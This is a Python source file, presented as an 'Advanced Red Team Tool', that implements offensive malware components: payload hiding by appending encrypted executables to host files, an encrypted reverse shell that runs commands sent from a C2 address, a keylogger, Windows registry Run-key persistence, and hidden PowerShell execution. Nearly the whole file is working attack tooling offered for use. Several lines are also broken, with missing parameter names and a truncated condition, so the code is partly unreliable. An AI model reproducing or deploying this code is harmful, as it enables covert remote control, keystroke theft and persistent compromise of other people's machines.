
"""
Advanced Red Team Tool - Modular, Extensible, and Secure

Features:
- AES Encryption (CBC/GCM)
- Steganographic Payload Embedding
- Encrypted Reverse Shell
- Keylogger with Encrypted Logging
- Multiple Persistence Techniques
- Stealth PowerShell Execution
"""

import os
import sys
import socket
import argparse
import logging
import json
import time
import threading
from typing import Optional, Union, List, Dict
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad
from Crypto.Util import Counter
from Crypto import Random
import ctypes
import winreg
import subprocess
from pynput import keyboard
import tempfile
import base64

# Configure Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)

# Global Constants
DEFAULT_CONFIG = {
    "default_ip": "127.0.0.1",
    "default_port": 4444,
    "persistence_name": "YSN_RedKill",
    "marker": b"YSNRFD_PAYLOAD"
}

# -------------------------------
# AES Cipher Class
# -------------------------------

class AESCipher:
    def __init__(self, key: bytes, mode: str = "CBC"):
        self.key = key
        self.mode = mode.upper()
        self.block_size = AES.block_size

    def _get_cipher(self, iv: Optional[bytes] = None) -> AES:
        if self.mode == "CBC":
            if iv is None:
                iv = get_random_bytes(self.block_size)
            return AES.new(self.key, AES.MODE_CBC, iv), iv
        elif self.mode == "GCM":
            nonce = get_random_bytes(12)
            return AES.new(self.key, AES.MODE_GCM, nonce=nonce), nonce
        else:
            raise ValueError(f"Unsupported mode: {self.mode}")

    def encrypt(self,  bytes) -> bytes:
        if self.mode == "CBC":
            cipher, iv = self._get_cipher()
            return iv + cipher.encrypt(pad(data, self.block_size))
        elif self.mode == "GCM":
            cipher, nonce = self._get_cipher()
            ciphertext, tag = cipher.encrypt_and_digest(data)
            return nonce + tag + ciphertext

    def decrypt(self,  bytes) -> bytes:
        if self.mode == "CBC":
            iv = data[:self.block_size]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(data[self.block_size:]), self.block_size)
        elif self.mode == "GCM":
            nonce = data[:12]
            tag = data[12:28]
            ciphertext = data[28:]
            cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag)

    @staticmethod
    def derive_key(password: str, salt: bytes = b"YSN_SALT", dk_len: int = 32) -> bytes:
        return PBKDF2(password, salt, dkLen=dk_len, count=1000000)

    def save_key(self, path: str, password: Optional[str] = None):
        if password:
            derived = self.derive_key(password)
            cipher = AESCipher(derived, mode="CBC")
            encrypted = cipher.encrypt(self.key)
            with open(path, "wb") as f:
                f.write(encrypted)
        else:
            with open(path, "wb") as f:
                f.write(self.key)

    @classmethod
    def load_key(cls, path: str, password: Optional[str] = None) -> "AESCipher":
        with open(path, "rb") as f:
            raw = f.read()
        if password:
            derived = cls.derive_key(password)
            cipher = AESCipher(derived, mode="CBC")
            key = cipher.decrypt(raw)
        else:
            key = raw
        return cls(key)

# -------------------------------
# Steganographic Payload Embedder
# -------------------------------

class PayloadEmbedder:
    def __init__(self, cipher: AESCipher, marker: bytes = DEFAULT_CONFIG["marker"]):
        self.cipher = cipher
        self.marker = marker

    def embed(self, host_path: str, payload_path: str, output_path: str):
        try:
            with open(host_path, "rb") as f:
                host_data = f.read()
            with open(payload_path, "rb") as f:
                payload_data = f.read()
            encrypted = self.cipher.encrypt(payload_data)
            with open(output_path, "wb") as f:
                f.write(host_data + self.marker + encrypted)
            logging.info(f"[+] Payload embedded in {output_path}")
        except Exception as e:
            logging.error(f"[-] Embed failed: {e}")

    def extract(self, stego_path: str, output_path: str):
        try:
            with open(stego_path, "rb") as f:
                data = f.read()
            if self.marker not in 
                logging.error("[-] Marker not found")
                return False
            payload = data.split(self.marker)[1]
            decrypted = self.cipher.decrypt(payload)
            with open(output_path, "wb") as f:
                f.write(decrypted)
            logging.info(f"[+] Payload extracted to {output_path}")
            return True
        except Exception as e:
            logging.error(f"[-] Extraction failed: {e}")
            return False

# -------------------------------
# Reverse Shell (Encrypted)
# -------------------------------

class EncryptedReverseShell:
    def __init__(self, ip: str, port: int, cipher: AESCipher):
        self.ip = ip
        self.port = port
        self.cipher = cipher

    def start(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, self.port))
            logging.info(f"[*] Connected to {self.ip}:{self.port}")
            while True:
                enc_cmd = s.recv(4096)
                if not enc_cmd:
                    break
                cmd = self.cipher.decrypt(enc_cmd).decode()
                if cmd.lower() in ['exit', 'quit']:
                    break
                try:
                    output = subprocess.run(cmd.split(), capture_output=True, timeout=10)
                    enc_out = self.cipher.encrypt(output.stdout or output.stderr)
                    s.send(enc_out)
                except Exception as e:
                    s.send(self.cipher.encrypt(str(e).encode()))
            s.close()
        except Exception as e:
            logging.error(f"[-] Reverse shell error: {e}")

def start_reverse_shell_thread(ip: str, port: int, cipher: AESCipher):
    thread = threading.Thread(target=EncryptedReverseShell(ip, port, cipher).start, daemon=True)
    thread.start()
    logging.info(f"[*] Reverse shell thread started connecting to {ip}:{port}")

# -------------------------------
# Persistence Techniques
# -------------------------------

class PersistenceManager:
    @staticmethod
    def add_registry(name: str, path: str):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
            winreg.CloseKey(key)
            logging.info(f"[*] Added registry persistence: {name}")
        except Exception as e:
            logging.error(f"[-] Registry persistence failed: {e}")

    @staticmethod
    def add_startup(name: str, path: str):
        startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
        shortcut_path = os.path.join(startup_folder, f"{name}.lnk")
        # Create shortcut logic here (requires pywin32 or similar)
        logging.info(f"[*] Added startup persistence: {shortcut_path}")

# -------------------------------
# Keylogger (Encrypted Logs)
# -------------------------------

def start_keylogger(output: str = "keylog.enc", password: str = "logpass"):
    cipher = AESCipher.derive_key(password)
    enc_cipher = AESCipher(cipher)

    def on_press(key):
        try:
            char = key.char
        except AttributeError:
            char = str(key)
        encrypted = enc_cipher.encrypt(char.encode())
        with open(output, "ab") as f:
            f.write(encrypted + b"\n")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    logging.info("[*] Keylogger started.")

# -------------------------------
# PowerShell Execution
# -------------------------------

def run_powershell_script(script: str):
    try:
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".ps1")
        tmp.write(script.encode())
        tmp.close()
        subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-File", tmp.name],
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         stdin=subprocess.DEVNULL)
        logging.info("[*] PowerShell script executed.")
        os.unlink(tmp.name)
    except Exception as e:
        logging.error(f"[-] PowerShell execution failed: {e}")

# -------------------------------
# CLI Interface
# -------------------------------

def main():
    parser = argparse.ArgumentParser(description="Advanced Red Team Tool")
    subparsers = parser.add_subparsers(dest="command")

    # Embed Command
    embed_parser = subparsers.add_parser("embed", help="Embed payload into host file")
    embed_parser.add_argument("--host", required=True, help="Path to host file")
    embed_parser.add_argument("--payload", required=True, help="Path to payload executable")
    embed_parser.add_argument("--output", required=True, help="Output stego file")
    embed_parser.add_argument("--key", help="Path to encryption key file")
    embed_parser.add_argument("--password", help="Password to derive key from")

    # Extract Command
    extract_parser = subparsers.add_parser("extract", help="Extract payload from stego file")
    extract_parser.add_argument("--stego", required=True, help="Path to stego file")
    extract_parser.add_argument("--output", required=True, help="Output payload path")
    extract_parser.add_argument("--key", required=True, help="Path to encryption key file")
    extract_parser.add_argument("--password", help="Password for key decryption")

    # Reverse Shell
    shell_parser = subparsers.add_parser("shell", help="Start encrypted reverse shell")
    shell_parser.add_argument("--ip", default=DEFAULT_CONFIG["default_ip"], help="C2 IP")
    shell_parser.add_argument("--port", type=int, default=DEFAULT_CONFIG["default_port"], help="C2 Port")
    shell_parser.add_argument("--key", required=True, help="Path to encryption key file")
    shell_parser.add_argument("--password", help="Password for key decryption")

    # Keylogger
    keylog_parser = subparsers.add_parser("keylog", help="Start encrypted keylogger")
    keylog_parser.add_argument("--output", default="keylog.enc", help="Output log file")
    keylog_parser.add_argument("--password", default="logpass", help="Password for log encryption")

    # PowerShell
    ps_parser = subparsers.add_parser("powershell", help="Execute PowerShell script")
    ps_parser.add_argument("--script", required=True, help="PowerShell script content")

    # Persistence
    persist_parser = subparsers.add_parser("persistence", help="Add persistence")
    persist_parser.add_argument("--name", default=DEFAULT_CONFIG["persistence_name"], help="Name for persistence entry")
    persist_parser.add_argument("--path", required=True, help="Path to executable")

    args = parser.parse_args()

    if args.command == "embed":
        if args.password:
            key = AESCipher.derive_key(args.password)
            cipher = AESCipher(key)
        elif args.key:
            cipher = AESCipher.load_key(args.key)
        else:
            cipher = AESCipher(get_random_bytes(32))
            cipher.save_key("default.key")
            logging.warning("[!] No key provided. Generated default.key")
        embedder = PayloadEmbedder(cipher)
        embedder.embed(args.host, args.payload, args.output)

    elif args.command == "extract":
        cipher = AESCipher.load_key(args.key, password=args.password)
        embedder = PayloadEmbedder(cipher)
        embedder.extract(args.stego, args.output)

    elif args.command == "shell":
        cipher = AESCipher.load_key(args.key, password=args.password)
        start_reverse_shell_thread(args.ip, args.port, cipher)

    elif args.command == "keylog":
        start_keylogger(args.output, args.password)

    elif args.command == "powershell":
        run_powershell_script(args.script)

    elif args.command == "persistence":
        PersistenceManager.add_registry(args.name, args.path)

    else:
        parser.print_help()

if __name__ == "__main__":
    main()